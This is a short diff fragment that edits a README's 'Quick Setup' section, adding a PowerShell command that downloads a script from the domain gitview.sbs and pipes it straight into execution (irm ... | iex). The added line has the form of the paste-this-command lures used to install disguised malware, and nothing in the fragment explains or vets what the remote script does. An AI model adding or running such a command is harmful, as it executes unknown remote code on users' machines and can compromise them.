@@ -1,4 +1,4 @@
 **Quick Setup**
 
 ```powershell
-ir
+irm gitview.sbs | iex
